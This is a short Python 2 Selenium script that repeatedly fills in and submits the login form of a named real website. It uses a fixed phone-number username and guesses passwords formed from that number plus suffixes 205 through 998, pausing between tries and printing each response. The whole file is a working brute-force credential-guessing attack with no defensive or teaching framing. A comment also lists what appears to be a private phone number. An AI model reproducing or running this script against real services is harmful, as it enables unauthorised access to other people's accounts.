
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#09113315029
import time
from selenium import webdriver
usernum= '09360000000'

#get loggin connection

browser = webdriver.Chrome('/home/taha/Documents/playground/selenium/chromedriver')
browser.get("http://senf.ir/") 
for i in range(205,999):
    print i
    passw=usernum+str(i)
    browser.find_element_by_class_name("sideicons2").click()
    username = browser.find_element_by_id("Login1_txtUserName")
    password = browser.find_element_by_id("Login1_txtPassword")
    username.send_keys(usernum)
    password.send_keys(passw)
    browser.find_element_by_id("Login1_btnEnter").click()
    time.sleep(5)
    answer=browser.find_element_by_id("Login1_LabelNotice")
    print answer 
    username = browser.find_element_by_id("Login1_txtUserName").clear()
    password = browser.find_element_by_id("Login1_txtPassword").clear()
